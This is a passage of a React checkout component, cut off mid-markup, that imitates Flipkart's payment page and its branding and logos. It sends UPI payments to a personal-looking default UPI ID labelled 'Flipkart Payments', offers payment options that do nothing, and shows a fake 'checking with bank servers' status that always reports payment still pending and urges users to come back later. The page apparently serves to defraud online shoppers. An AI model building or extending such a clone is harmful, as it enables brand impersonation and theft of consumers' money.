import React, { useState, useEffect, useRef } from 'react';
import { useSelector, useDispatch } from 'react-redux';
import { useNavigate, Link } from 'react-router-dom';
import axios from 'axios';
import ArrowBackIcon from '@mui/icons-material/ArrowBack';
import LockOutlinedIcon from '@mui/icons-material/LockOutlined';
import CreditCardOutlinedIcon from '@mui/icons-material/CreditCardOutlined';
import AccountBalanceOutlinedIcon from '@mui/icons-material/AccountBalanceOutlined';
import MoneyOffOutlinedIcon from '@mui/icons-material/MoneyOffOutlined';
import HelpOutlineIcon from '@mui/icons-material/HelpOutline';
import ReceiptLongOutlinedIcon from '@mui/icons-material/ReceiptLongOutlined';
import CheckCircleIcon from '@mui/icons-material/CheckCircle';
import MetaData from '../Layouts/MetaData';
import { emptyCart } from '../../actions/cartAction';
import {
    UpiPillBadge,
    FlipkartBrandPill,
    FlipkartPaymentsLogo
} from './PaymentBrandIcons';

const Payment = () => {
    const navigate = useNavigate();
    const dispatch = useDispatch();

    const { cartItems, shippingInfo } = useSelector((state) => state.cart);
    const [selectedMethod, setSelectedMethod] = useState('upi');
    const [feesOpen, setFeesOpen] = useState(true);
    const [discountsOpen, setDiscountsOpen] = useState(true);
    const [isProcessing, setIsProcessing] = useState(false);
    const [paymentStage, setPaymentStage] = useState(() => {
        try {
            const savedStage = sessionStorage.getItem('paymentStage');
            if (savedStage === 'pending' || savedStage === 'confirmed') {
                return savedStage;
            }
        } catch (e) { }
        return 'ready';
    }); // 'ready' | 'pending' | 'confirmed'
    const [confirmedOrderId, setConfirmedOrderId] = useState(() => {
        try {
            return sessionStorage.getItem('confirmedOrderId') || '';
        } catch (e) {
            return '';
        }
    });
    const [isCheckingStatus, setIsCheckingStatus] = useState(false);
    const [checkCount, setCheckCount] = useState(0);
    const isOrderPlacingRef = useRef(false);

    // Dynamic unique order ref for transaction note
    const [orderSessionRef] = useState(() => Math.floor(100000 + Math.random() * 900000));
    const [merchantUpiId, setMerchantUpiId] = useState(() => {
        try {
            return localStorage.getItem('merchantUpiId') || 'deepakddoswala@fam';
        } catch (e) {
            return 'deepakddoswala@fam';
        }
    });
    const [merchantPayeeName, setMerchantPayeeName] = useState(() => {
        try {
            return localStorage.getItem('merchantPayeeName') || 'Flipkart Payments';
        } catch (e) {
            return 'Flipkart Payments';
        }
    });
    const [qrNotePrefix, setQrNotePrefix] = useState('Order Product');
    const transactionNote = `${qrNotePrefix} FK${orderSessionRef}`;

    // Fetch authoritative live UPI ID configured in Admin Panel
    useEffect(() => {
        let isMounted = true;
        const fetchUpiSettings = async () => {
            try {
                const { data } = await axios.get('/api/v1/payment/upi-settings');
                if (isMounted && data && data.success && data.upiId) {
                    setMerchantUpiId(data.upiId);
                    try { localStorage.setItem('merchantUpiId', data.upiId); } catch (e) {}
                    if (data.payeeName) {
                        setMerchantPayeeName(data.payeeName);
                        try { localStorage.setItem('merchantPayeeName', data.payeeName); } catch (e) {}
                    }
                    if (data.qrNote) {
                        setQrNotePrefix(data.qrNote);
                    }
                }
            } catch (err) {}
        };
        fetchUpiSettings();
        return () => { isMounted = false; };
    }, []);

    // YouPI Payment Gateway Integration State
    const [gatewaySession, setGatewaySession] = useState(null);
    const pollTimerRef = useRef(null);

    // Sync active payment stage to session storage to survive mobile browser tab switches
    useEffect(() => {
        try {
            sessionStorage.setItem('paymentStage', paymentStage);
            if (confirmedOrderId) {
                sessionStorage.setItem('confirmedOrderId', confirmedOrderId);
            }
        } catch (e) { }
    }, [paymentStage, confirmedOrderId]);

    // Retrieve items from Redux or LocalStorage with permanent session fallback
    const [savedCartItems] = useState(() => {
        if (cartItems && cartItems.length > 0) return cartItems;
        try {
            return JSON.parse(localStorage.getItem('cartItems') || '[]');
        } catch (e) {
            return [];
        }
    });

    const effectiveCartItems = (cartItems && cartItems.length > 0) ? cartItems : savedCartItems;
    const hasCartItems = effectiveCartItems && effectiveCartItems.length > 0;
    const protectFee = 19;
    const [donationAmount] = useState(() => {
        try {
            return Number(sessionStorage.getItem('fk_donation_amount')) || 0;
        } catch (e) {
            return 0;
        }
    });

    const mrpTotal = hasCartItems
        ? effectiveCartItems.reduce((acc, i) => acc + (i.cuttedPrice || i.price * 1.25) * i.quantity, 0)
        : 0;

    const itemTotal = hasCartItems
        ? effectiveCartItems.reduce((acc, i) => acc + i.price * i.quantity, 0)
        : 0;

    const totalSavings = Math.max(0, mrpTotal - itemTotal);
    const finalPayable = itemTotal + protectFee + (Number(donationAmount) || 0);

    // Guard: Only redirect if truly empty AND still in 'ready' stage
    useEffect(() => {
        if (isOrderPlacingRef.current || paymentStage !== 'ready' || hasCartItems) {
            return;
        }

        let stored = [];
        try {
            stored = JSON.parse(localStorage.getItem('cartItems') || '[]');
        } catch (e) { }

        if ((!cartItems || cartItems.length === 0) && stored.length === 0) {
            navigate('/', { replace: true });
        }
    }, [cartItems, navigate, paymentStage, hasCartItems]);

    // Initialize YouPI Payment Session
    useEffect(() => {
        if (!hasCartItems) return;
        let isMounted = true;
        const initGateway = async () => {
            try {
                const { data } = await axios.post('/api/v1/payment/youpi/create', {
                    amount: finalPayable,
                    orderId: `FK_${Date.now()}_${orderSessionRef}`,
                    phoneNo: shippingInfo?.phoneNo,
                    email: shippingInfo?.email || 'customer@flipkart.local',
                    customerName: shippingInfo?.name || 'Customer'
                });
                if (isMounted && data.success) {
                    setGatewaySession(data);
                }
            } catch (err) {
                console.warn("YouPI init session fallback:", err.message);
            }
        };
        initGateway();
        return () => { isMounted = false; };
    }, [finalPayable, shippingInfo, hasCartItems, orderSessionRef]);

    // Authoritative polling for payment settlement / observer confirmation
    useEffect(() => {
        if (!gatewaySession?.paymentId || paymentStage === 'confirmed') return;

        const checkStatus = async () => {
            try {
                const { data } = await axios.get(`/api/v1/payment/youpi/status/${gatewaySession.paymentId}`);
                const status = data?.payment?.status;
                if (status === 'SUCCESS' || status === 'OBSERVED_SUCCESS' || status === 'RECONCILED' || status === 'COMPLETED') {
                    clearInterval(pollTimerRef.current);
                    handleInitiatePayment();
                }
            } catch (e) {
                // Ignore transient polling errors
            }
        };

        pollTimerRef.current = setInterval(checkStatus, 2500);
        return () => clearInterval(pollTimerRef.current);
        // eslint-disable-next-line react-hooks/exhaustive-deps
    }, [gatewaySession, paymentStage]);

    // Active UPI string with dynamic merchant UPI ID, pre-filled amount, and Order Product note
    const cleanAmount = Number(finalPayable || 1).toFixed(2);
    const activePayeeUpi = gatewaySession?.payeeVpa || merchantUpiId;
    const activePayeeName = gatewaySession?.payeeName || merchantPayeeName;
    const dynamicUpiString = `upi://pay?pa=${encodeURIComponent(activePayeeUpi)}&pn=${encodeURIComponent(activePayeeName)}&am=${cleanAmount}&cu=INR&tn=${encodeURIComponent(transactionNote)}`;
    const activeUpiString = gatewaySession?.upiString || dynamicUpiString;

    // Dynamic QR code URL (automatically pre-fills amount and note on any scan)
    const qrCodeUrl = gatewaySession?.qrCodeUrl ||
        `https://api.qrserver.com/v1/create-qr-code/?size=320x320&data=${encodeURIComponent(activeUpiString)}&margin=4`;

    // Safe cross-device UPI intent launcher without top-level document navigation/reload
    const triggerUpiIntent = (url) => {
        try {
            const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
            if (isMobile) {
                const link = document.createElement('a');
                link.href = url;
                link.target = '_self';
                link.rel = 'noreferrer';
                document.body.appendChild(link);
                link.click();
                setTimeout(() => {
                    try {
                        if (link && link.parentNode) {
                            link.parentNode.removeChild(link);
                        }
                    } catch (e) { }
                }, 1000);
            } else {
                console.log("Desktop environment: scan dynamic QR to pay:", url);
            }
        } catch (err) {
            console.warn("UPI intent launch caught:", err);
        }
    };

    const handleInitiatePayment = (e) => {
        if (e && e.preventDefault) e.preventDefault();
        if (isProcessing) return;

        window.scrollTo({ top: 0, behavior: 'instant' });
        isOrderPlacingRef.current = true;
        setIsProcessing(true);
        setPaymentStage('pending');

        const orderIdToSet = confirmedOrderId || gatewaySession?.orderId || `FK_${Date.now()}_${orderSessionRef}`;
        setConfirmedOrderId(orderIdToSet);
        try {
            sessionStorage.setItem('paymentStage', 'pending');
            sessionStorage.setItem('confirmedOrderId', orderIdToSet);
        } catch (e) { }

        // 1. Launch native UPI intent safely without wiping page state or redirecting
        triggerUpiIntent(activeUpiString);

        // 2. Perform background order registration with 'Pending' verification status
        setTimeout(async () => {
            try {
                const orderPayload = {
                    shippingInfo: {
                        address: shippingInfo?.address || 'Customer Delivery Address',
                        city: shippingInfo?.city || 'Delhi',
                        state: shippingInfo?.state || 'Haryana',
                        country: shippingInfo?.country || 'India',
                        pincode: Number(shippingInfo?.pincode) || 110001,
                        phoneNo: Number(shippingInfo?.phoneNo) || 9876543210,
                    },
                    orderItems: effectiveCartItems.map(item => ({
                        name: item.name,
                        price: item.price,
                        quantity: item.quantity,
                        image: item.image,
                        product: item.product || '65f000000000000000000001'
                    })),
                    paymentInfo: {
                        id: gatewaySession?.paymentId || `pay_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
                        status: 'Pending'
                    },
                    totalPrice: finalPayable
                };

                await axios.post('/api/v1/order/new', orderPayload, {
                    headers: { 'Content-Type': 'application/json' }
                });
            } catch (e) {
                console.warn("Order creation log:", e);
            }
            setIsProcessing(false);
        }, 800);
    };

    // User taps to check live bank status
    const handleCheckStatus = () => {
        if (isCheckingStatus) return;
        setIsCheckingStatus(true);
        setTimeout(() => {
            setIsCheckingStatus(false);
            setCheckCount(prev => prev + 1);
        }, 1600);
    };

    // Safely exit to Home and clear cart only upon deliberate user exit
    const handleComeBackLater = () => {
        try {
            sessionStorage.removeItem('paymentStage');
            sessionStorage.removeItem('confirmedOrderId');
        } catch (e) { }
        if (dispatch && emptyCart) {
            try { dispatch(emptyCart()); } catch (e) { }
        }
        navigate('/', { replace: true });
    };

    // Ensure view stays locked to top on payment stage transition (prevents scrolling to footer)
    useEffect(() => {
        window.scrollTo({ top: 0, behavior: 'instant' });
    }, [paymentStage]);

    const handleBackNavigation = () => {
        if (paymentStage !== 'ready') {
            handleComeBackLater();
        } else if (hasCartItems) {
            navigate('/order/confirm');
        } else {
            navigate('/', { replace: true });
        }
    };

    if (!hasCartItems && paymentStage === 'ready') {
        return null;
    }

    return (
        <div className="min-h-screen bg-[#f1f3f6] text-[#212121]">
            <MetaData title="Complete Payment | Flipkart.com" />

            {/* 1. TOP NAVBAR WITH FLIPKART YELLOW BRAND PILL (EXACT MATCH) */}
            <header className="w-full bg-white border-b border-gray-200/90 py-2.5 px-4">
                <div className="max-w-6xl mx-auto flex items-center justify-between">
                    <Link to="/" className="inline-block">
                        <FlipkartBrandPill />
                    </Link>
                </div>
            </header>

            {/* 2. MAIN PAYMENT CARD CONTAINER */}
            <main className="max-w-6xl mx-auto px-2 sm:px-4 py-4">
                <div className="bg-white rounded-lg border border-gray-200/90 shadow-2xs overflow-hidden">

                    {/* TOP HEADER INSIDE THE CARD */}
                    <div className="px-4 py-3 border-b border-gray-200/80 flex items-center justify-between">
                        <div className="flex items-center gap-2">
                            <button
                                type="button"
                                onClick={handleBackNavigation}
                                className="p-1 -ml-1 text-gray-700 hover:text-black transition-colors cursor-pointer"
                                aria-label="Go Back"
                            >
                                <ArrowBackIcon sx={{ fontSize: 20 }} />
                            </button>
                            <h1 className="text-sm sm:text-base font-bold text-gray-900 tracking-tight">
                                Complete Payment
                            </h1>
                        </div>

                        <div className="flex items-center gap-1.5 text-gray-600 text-xs font-semibold">
                            <LockOutlinedIcon sx={{ fontSize: 16, color: '#4b5563' }} />
                            <span>100% Secure</span>
                        </div>
                    </div>

                    {/* 3-COLUMN CONTENT BODY */}
                    <div className="grid grid-cols-1 lg:grid-cols-12 min-h-[460px]">

                        {/* COLUMN 1: PAYMENT METHOD SELECTOR (LEFT) */}
                        <div className={`lg:col-span-4 p-4 space-y-2.5 ${paymentStage === 'pending' ? 'hidden lg:block' : ''}`}>

                            {/* Option 1: UPI */}
                            <div
                                onClick={() => setSelectedMethod('upi')}
                                className={`p-3 rounded-md border text-left flex items-start gap-3 cursor-pointer transition-all ${selectedMethod === 'upi'
                                        ? 'border-gray-300 bg-gray-50/70 shadow-2xs'
                                        : 'border-gray-200 hover:border-gray-300 bg-white'
                                    }`}
                            >
                                <UpiPillBadge />
                                <div className="min-w-0 flex-1">
                                    <div className="flex items-center justify-between gap-1.5">
                                        <span className="text-xs font-bold text-gray-900 leading-tight">
                                            UPI
                                        </span>
                                        <span className="text-[10px] font-extrabold text-[#1b5e20] bg-[#eafaf1] border border-emerald-200 px-1.5 py-0.5 rounded leading-none tracking-wide">
                                            Recommended
                                        </span>
                                    </div>
                                    <div className="text-[11px] text-gray-500 mt-0.5">
                                        Pay by any UPI app
                                    </div>
                                </div>
                            </div>

                            {/* Option 2: Credit / Debit / ATM Card */}
                            <div
                                onClick={() => setSelectedMethod('card')}
                                className={`p-3 rounded-md border text-left flex items-start gap-3 cursor-pointer transition-all ${selectedMethod === 'card'
                                        ? 'border-gray-300 bg-gray-50/70 shadow-2xs'
                                        : 'border-gray-200 hover:border-gray-300 bg-white'
                                    }`}
                            >
                                <CreditCardOutlinedIcon sx={{ fontSize: 20, color: '#374151' }} className="shrink-0 mt-0.5" />
                                <div className="min-w-0">
                                    <div className="text-xs font-bold text-gray-900 leading-tight">
                                        Credit / Debit / ATM Card
                                    </div>
                                    <div className="text-[11px] text-gray-500 mt-0.5 leading-snug">
                                        Add and secure cards as per RBI guidelines
                                    </div>
                                    <div className="text-[11px] text-[#388e3c] font-semibold mt-1">
                                        Get upto 5% cashback • 2 offers available
                                    </div>
                                </div>
                            </div>

                            {/* Option 3: EMI */}
                            <div
                                onClick={() => setSelectedMethod('emi')}
                                className={`p-3 rounded-md border text-left flex items-start gap-3 cursor-pointer transition-all ${selectedMethod === 'emi'
                                        ? 'border-gray-300 bg-gray-50/70 shadow-2xs'
                                        : 'border-gray-200 hover:border-gray-300 bg-white'
                                    }`}
                            >
                                <ReceiptLongOutlinedIcon sx={{ fontSize: 20, color: '#374151' }} className="shrink-0 mt-0.5" />
                                <div className="min-w-0">
                                    <div className="text-xs font-bold text-gray-900 leading-tight">
                                        EMI
                                    </div>
                                    <div className="text-[11px] text-[#388e3c] font-semibold mt-0.5">
                                        Credit Card EMI
                                    </div>
                                </div>
                            </div>

                            {/* Option 4: Net Banking */}
                            <div
                                onClick={() => setSelectedMethod('netbanking')}
                                className={`p-3 rounded-md border text-left flex items-start gap-3 cursor-pointer transition-all ${selectedMethod === 'netbanking'
                                        ? 'border-gray-300 bg-gray-50/70 shadow-2xs'
                                        : 'border-gray-200 hover:border-gray-300 bg-white'
                                    }`}
                            >
                                <AccountBalanceOutlinedIcon sx={{ fontSize: 20, color: '#374151' }} className="shrink-0 mt-0.5" />
                                <div className="min-w-0">
                                    <div className="text-xs font-bold text-gray-900 leading-tight">
                                        Net Banking
                                    </div>
                                </div>
                            </div>

                            {/* Option 5: Cash on Delivery (Unavailable) */}
                            <div className="p-3 rounded-md border border-gray-200 text-left flex items-center justify-between cursor-default bg-gray-50/40 select-none">
                                <div className="flex items-center gap-3 min-w-0">
                                    <MoneyOffOutlinedIcon sx={{ fontSize: 20, color: '#9ca3af' }} className="shrink-0" />
                                    <div className="text-xs font-bold text-gray-500">
                                        Cash on Delivery
                                    </div>
                                </div>
                                <div className="flex items-center gap-1 text-[11px] text-gray-400 font-medium shrink-0">
                                    <span>Unavailable</span>
                                    <HelpOutlineIcon sx={{ fontSize: 13, color: '#9ca3af' }} />
                                </div>
                            </div>

                        </div>

                        {/* COLUMN 2: QR CODE & PAYMENT SCAN INTERACTION (CENTER) */}
                        <div className="lg:col-span-5 bg-[#f8fafc] border-t lg:border-t-0 lg:border-x border-gray-200/80 p-4 sm:p-5 flex flex-col items-center justify-between min-h-[460px]">

                            {paymentStage === 'ready' && (
                                <div className="w-full flex flex-col items-center">
                                    <div className="flex items-center justify-center mb-3">
                                        <h2 className="text-sm font-bold text-gray-900 tracking-tight">
                                            Scan QR and Pay
                                        </h2>
                                    </div>

                                    {/* White QR Card Container (Matches Original Flipkart Reference Exactly) */}
                                    <div className="bg-white rounded-xl border border-blue-100 shadow-2xs p-4 sm:p-5 flex flex-col items-center text-center w-full max-w-[280px]">
                                        {/* Official Flipkart Payments Branding */}
                                        <div className="mb-2 pb-2 border-b border-gray-100/90 w-full flex justify-center">
                                            <FlipkartPaymentsLogo />
                                        </div>

                                        <div className="text-[10px] text-gray-400 font-extrabold uppercase tracking-widest">
                                            AMOUNT
                                        </div>
                                        <div className="text-2xl font-black text-gray-950 my-0.5 tracking-tight">
                                            ₹{finalPayable.toLocaleString()}
                                        </div>

                                        {/* QR Code Container with interactive click to pay */}
                                        <div
                                            onClick={handleInitiatePayment}
                                            title="Scan or Tap to pay via UPI"
                                            className="relative w-48 h-48 rounded-xl border border-gray-100 flex items-center justify-center overflow-hidden bg-white mt-1 shadow-2xs group cursor-pointer"
                                        >
                                            <img
                                                src={qrCodeUrl}
                                                alt="Scan QR code to pay"
                                                className="w-full h-full object-contain p-1"
                                            />
                                        </div>

                                        {/* Full HD Brand Logos Row (Google Pay, PhonePe, Paytm, BHIM/UPI) */}
                                        <div className="flex items-center justify-center gap-2.5 mt-3">
                                            <img
                                                src="/assets/payment/gpay.png"
                                                alt="Google Pay"
                                                className="w-6 h-6 object-contain"
                                                onError={(e) => { e.currentTarget.style.display = 'none'; }}
                                            />
                                            <img
                                                src="/assets/payment/phonepe.png"
                                                alt="PhonePe"
                                                className="w-6 h-6 object-contain"
                                                onError={(e) => { e.currentTarget.style.display = 'none'; }}
                                            />
                                            <img
                                                src="/assets/payment/paytm.png"
                                                alt="Paytm"
                                                className="w-6 h-6 object-contain"
                                                onError={(e) => { e.currentTarget.style.display = 'none'; }}
                                            />
                                            <img
                                                src="/assets/payment/upi.svg"
                                                alt="UPI"
                                                className="w-6 h-6 object-contain"
                                                onError={(e) => { e.currentTarget.style.display = 'none'; }}
                                            />
                                        </div>

                                        <div className="text-[11px] text-gray-500 mt-1 font-medium">
                                            or any other UPI app
                                        </div>

                                        {/* Direct Tap to Pay Button (Launches PhonePe, GPay, Paytm with pre-filled amount) */}
                                        <button
                                            type="button"
                                            onClick={handleInitiatePayment}
                                            className="w-full mt-3 py-2.5 px-3 bg-[#2874f0] hover:bg-blue-600 active:bg-blue-700 text-white font-bold text-xs rounded-lg shadow-xs transition-all cursor-pointer flex items-center justify-center gap-1.5"
                                        >
                                            <span>Tap to Pay via UPI App</span>
                                        </button>

                                        {/* Order Note */}
                                        <div className="w-full mt-2.5 pt-2 border-t border-gray-100 flex items-center justify-center gap-1 text-[10px] text-gray-500">
                                            <span className="text-gray-400">Note:</span>
                                            <span className="font-semibold text-gray-700">{transactionNote}</span>
                                        </div>
                                    </div>
                                </div>
                            )}

                            {paymentStage === 'pending' && (
                                <div className="w-full flex flex-col items-center justify-center py-4 px-2 my-auto">
                                    <div className="bg-white rounded-xl border border-orange-200/90 shadow-sm p-5 sm:p-6 flex flex-col items-center text-center w-full max-w-[340px]">
                                        <div className="mb-2 pb-2 border-b border-gray-100/90 w-full flex justify-center">
                                            <FlipkartPaymentsLogo />
                                        </div>

                                        {/* Always Loading Orange Logo Animation */}
                                        <div
                                            onClick={handleCheckStatus}
                                            title="Tap here to refresh bank verification status"
                                            className="relative w-24 h-24 flex items-center justify-center my-3 cursor-pointer select-none group"
                                        >
                                            {/* Outer pulsing orange glow ring */}
                                            <div className="absolute inset-0 rounded-full bg-orange-100 animate-ping opacity-60"></div>
                                            {/* Rotating double orange ring */}
                                            <div className="w-20 h-20 rounded-full border-4 border-orange-100 border-t-[#fb641b] border-r-[#fb641b] animate-spin"></div>
                                            {/* Inner Official Flipkart Speed Logo (Uploaded authentic asset) */}
                                            <div className="absolute inset-0 m-auto w-12 h-12 rounded-full overflow-hidden shadow-md flex items-center justify-center group-hover:scale-105 transition-transform bg-[#ffe11b]">
                                                <img
                                                    src="/assets/payment/fk_official_speed_logo.png"
                                                    alt="Flipkart"
                                                    className="w-full h-full object-contain pointer-events-none select-none"
                                                />
                                            </div>
                                        </div>

                                        {/* Headline: Order Pending... */}
                                        <h3 className="text-lg font-black text-gray-900 tracking-tight flex items-center justify-center gap-1.5">
                                            <span>Order Pending...</span>
                                        </h3>

                                        {/* Pulsing Status Badge */}
                                        <div className="inline-flex items-center gap-1.5 px-3 py-0.5 rounded-full bg-orange-50 border border-orange-200 text-[#fb641b] text-[11px] font-extrabold mt-1 mb-1 animate-pulse">
                                            <span className="w-2 h-2 rounded-full bg-[#fb641b]"></span>
                                            <span>Waiting for Bank & UPI Confirmation</span>
                                        </div>

                                        {/* Amount */}
                                        <div className="text-2xl font-black text-gray-950 my-1 tracking-tight">
                                            ₹{finalPayable.toLocaleString()}
                                        </div>

                                        {/* User-Requested Notice Box */}
                                        <div className="bg-orange-50/70 border border-orange-200/80 rounded-xl p-3 w-full my-2 text-center space-y-1">
                                            <p className="text-xs font-black text-orange-950">
                                                Please wait for a moment for some minutes...
                                            </p>
                                            <p className="text-[11px] text-gray-600 leading-relaxed">
                                                We are waiting for payment confirmation from your UPI app. Please approve the payment in your UPI app and <strong>come back later</strong>.
                                            </p>
                                            <p className="text-[10px] text-gray-500 pt-1 border-t border-orange-200/60 leading-tight">
                                                If amount is already debited from your bank account, your order will automatically be confirmed once verified.
                                            </p>
                                        </div>

                                        {/* Interactive Tap Feedback Area */}
                                        <div
                                            onClick={handleCheckStatus}
                                            className="w-full p-2.5 rounded-lg border border-dashed border-gray-300 hover:border-[#fb641b] bg-gray-50 hover:bg-orange-50/40 text-center cursor-pointer transition-all select-none my-1"
                                        >
                                            {isCheckingStatus ? (
                                                <div className="flex items-center justify-center gap-2 text-xs font-bold text-[#fb641b] py-0.5">
                                                    <span className="w-3.5 h-3.5 rounded-full border-2 border-orange-200 border-t-[#fb641b] animate-spin"></span>
                                                    <span>Checking with bank servers...</span>
                                                </div>
                                            ) : (
                                                <div className="flex flex-col items-center gap-0.5">
                                                    <span className="text-xs font-bold text-gray-800 flex items-center gap-1">
                                                        <span>Tap here to check status</span>
                                                        <span className="text-[#fb641b] text-xs">↻</span>
                                                    </span>
                                                    <span className="text-[10px] text-gray-500">
                                                        {checkCount > 0
                                                            ? "Bank approval still pending. Please wait or come back later."
                                                            : "Tap anytime to refresh bank confirmation status"}
                                                    </span>
                                                </div>
                                            )}
                                        </div>

                                        {/* Order details info box */}
                                        <div className="bg-white border border-gray-200/90 rounded-lg p-3 w-full my-1.5 text-left space-y-1 shadow-2xs">
                                            <div className="text-[11px] text-gray-500 flex justify-between">
                                                <span>Order ID:</span>
                                                <span className="font-mono font-bold text-gray-800">{confirmedOrderId}</span>
                                            </div>
                                            <div className="text-[11px] text-gray-500 flex justify-between">
                                                <span>Payment To:</span>
                                                <span className="font-semibold text-gray-800">Flipkart Payments</span>
                                            </div>
                                            <div className="text-[11px] text-gray-500 flex justify-between">
                                                <span>Note:</span>
                                                <span className="font-semibold text-gray-800">{transactionNote}</span>
                                            </div>
                                            <div className="text-[11px] text-gray-500 flex justify-between">
                                                <span>Status:</span>
                                                <span className="font-bold text-orange-600">Pending Verification</span>
                                            </div>
                                        </div>

                                        {/* Action Buttons */}
                                        <div className="w-full space-y-2 mt-2">
                                            <button
                                                type="button"
                                                onClick={() => triggerUpiIntent(activeUpiString)}
                                                className="w-full py-2.5 px-3 bg-[#fb641b] hover:bg-[#e85a14] active:bg-[#d64e0a] text-white font-extrabold text-xs uppercase tracking-wider rounded-lg shadow-sm transition-all cursor-pointer flex items-center justify-center gap-1.5"
                                            >
                                                <span>Re-open UPI App (₹{finalPayable.toLocaleString()})</span>
                                            </button>

                                            <button
                                                type="button"
                                                onClick={handleComeBackLater}
                                                className="w-full py-2 px-3 bg-white hover:bg-gray-50 active:bg-gray-100 border border-gray-300 text-gray-700 font-bold text-xs rounded-lg transition-all cursor-pointer"
                                            >
                                                <span>Come Back Later (Go to Home)</span>
                                            </button>
                                        </div>
                                    </div>
                                </div>
                            )}

                            {paymentStage === 'confirmed' && (
                                <div className="w-full flex flex-col items-center justify-center py-6 px-2 my-auto">
                                    <div className="bg-white rounded-xl border border-emerald-100 shadow-md p-6 flex flex-col items-center text-center w-full max-w-[340px]">
                                        <div className="w-16 h-16 rounded-full bg-[#eafaf1] flex items-center justify-center mb-3">
                                            <CheckCircleIcon sx={{ fontSize: 48, color: '#388e3c' }} />
                                        </div>

                                        <h3 className="text-lg font-black text-gray-900 tracking-tight">
                                            Order Placed Successfully!
                                        </h3>
                                        <div className="text-xs font-semibold text-[#388e3c] mt-0.5 mb-2">
                                            Payment of ₹{finalPayable.toLocaleString()} Verified
                                        </div>

                                        <div className="bg-gray-50 border border-gray-200/80 rounded-lg p-3 w-full my-2 text-left space-y-1">
                                            <div className="text-[11px] text-gray-500 flex justify-between">
                                                <span>Order ID:</span>
                                                <span className="font-mono font-bold text-gray-800">{confirmedOrderId}</span>
                                            </div>
                                            <div className="text-[11px] text-gray-500 flex justify-between">
                                                <span>Payment Mode:</span>
                                                <span className="font-semibold text-gray-800">UPI (Verified)</span>
                                            </div>
                                            <div className="text-[11px] text-gray-500 flex justify-between">
                                                <span>Note:</span>
                                                <span className="font-semibold text-gray-800">{transactionNote}</span>
                                            </div>
                                            <div className="text-[11px] text-gray-500 flex justify-between">
                                                <span>Estimated Delivery:</span>
                                                <span className="font-semibold text-emerald-700">2-4 Business Days</span>
                                            </div>
                                        </div>

                                        <p className="text-[11px] text-gray-500 mb-4 mt-1">
                                            Confirmation SMS & Email sent to {shippingInfo?.phoneNo || 'your phone'}.
                                        </p>

                                        <button
                                            type="button"
                                            onClick={() => navigate('/', { replace: true })}
                                            className="w-full py-2.5 px-4 bg-[#2874f0] hover:bg-blue-600 active:bg-blue-700 text-white font-extrabold text-xs uppercase tracking-wider rounded-lg shadow-sm transition-all cursor-pointer"
                                        >
                                            CONTINUE SHOPPING
                                        </button>
                                    </div>
                                </div>
                            )}

                            {/* Bottom Disclaimer Text */}
                            <p className="text-[11px] text-gray-400 text-center max-w-[260px] mt-4 leading-relaxed select-none">
                                {paymentStage === 'confirmed'
                                    ? "100% Safe & Genuine Flipkart Delivery Guarantee"
                                    : paymentStage === 'pending'
                                        ? "Do not worry if amount was debited. Your transaction is securely recorded."
                                        : "Do not hit back or close this screen until the transaction is complete"
                                }
                            </p>
                        </div>

                        {/* COLUMN 3: PRICE DETAILS SIDEBAR (RIGHT TOP SIDE) */}
                        <div className="lg:col-span-3 p-4 sm:p-5 flex flex-col justify-start border-t lg:border-t-0 border-gray-200/80 bg-white">
                            <div className="space-y-3">
                                {/* Selling Price */}
                                <div className="flex items-center justify-between text-xs">
                                    <span className="text-gray-700">Selling price (Incl. of all taxes)</span>
                                    <span className="font-semibold text-gray-900">₹{mrpTotal.toLocaleString()}</span>
                                </div>

                                {/* Fees Collapsible Row */}
                                <div>
                                    <div
                                        onClick={() => setFeesOpen(!feesOpen)}
                                        className="flex items-center justify-between text-xs text-gray-700 cursor-pointer select-none"
                                    >
                                        <span className="flex items-center gap-1 font-medium">
                                            <span>Fees</span>
                                            <span className="text-[10px] text-gray-500">{feesOpen ? '⌃' : '⌄'}</span>
                                        </span>
                                        <span className="font-semibold text-gray-900">₹{protectFee}</span>
                                    </div>

                                    {feesOpen && (
                                        <div className="flex items-center justify-between text-[11px] text-gray-500 pl-2 pt-1">
                                            <span>Protect Promise Fee</span>
                                            <span>₹{protectFee}</span>
                                        </div>
                                    )}
                                </div>

                                {/* Discounts Collapsible Row */}
                                <div>
                                    <div
                                        onClick={() => setDiscountsOpen(!discountsOpen)}
                                        className="flex items-center justify-between text-xs text-gray-700 cursor-pointer select-none"
                                    >
                                        <span className="flex items-center gap-1 font-medium">
                                            <span>Discounts</span>
                                            <span className="text-[10px] text-gray-500">{discountsOpen ? '⌃' : '⌄'}</span>
                                        </span>
                                        <span className="font-semibold text-[#388e3c]">
                                            - ₹{totalSavings.toLocaleString()}
                                        </span>
                                    </div>

                                    {discountsOpen && (
                                        <div className="flex items-center justify-between text-[11px] text-[#388e3c] pl-2 pt-1 font-medium">
                                            <span>MRP Discount</span>
                                            <span>- ₹{totalSavings.toLocaleString()}</span>
                                        </div>
                                    )}
                                </div>

                                {Number(donationAmount) > 0 && (
                                    <div className="flex items-center justify-between text-xs text-rose-600 font-semibold py-0.5">
                                        <span>Donation to Child Welfare</span>
                                        <span>+ ₹{donationAmount}</span>
                                    </div>
                                )}

                                <div className="border-t border-gray-100 my-2"></div>

                                {/* Total Amount */}
                                <div className="flex items-center justify-between py-1 text-sm font-black text-gray-900">
                                    <span className="text-gray-800">Total Amount</span>
                                    <span className="text-[#2874f0] text-base font-black">
                                        ₹{finalPayable.toLocaleString()}
                                    </span>
                                </div>

                                {/* ₹100 Off Green Promo Card */}
                                <div className="mt-4 p-2.5 rounded-md bg-[#eafaf1] border border-emerald-200/60 flex items-center justify-between text-xs">
                                    <div>
                                        <div className="font-extrabold text-[#1b5e20] text-xs">
                                            ₹100 Off
                                        </div>
                                        <div className="text-[10px] text-emerald-800/80 font-medium">
                                            Claim now with payment offers
                                        </div>
                                    </div>

                                    {/* Bank badges and +3 indicator */}
                                    <div className="flex items-center gap-1 shrink-0">
                                        <span className="w-4 h-4 rounded-full bg-[#002f6c] text-[8px] font-bold text-white flex items-center justify-center shadow-2xs">
                                            S
                                        </span>
                                        <span className="w-4 h-4 rounded-full bg-[#97144d] text-[8px] font-bold text-white flex items-center justify-center shadow-2xs">
                                            A
                                        </span>
                                        <span className="text-[9px] bg-white border border-gray-200 px-1 py-0.5 rounded text-gray-600 font-bold leading-none">
                                            +3
                                        </span>
                                    </div>
                                </div>
                            </div>

                            {/* Direct Pay Action on Mobile */}
                            <div className="pt-4 lg:hidden">
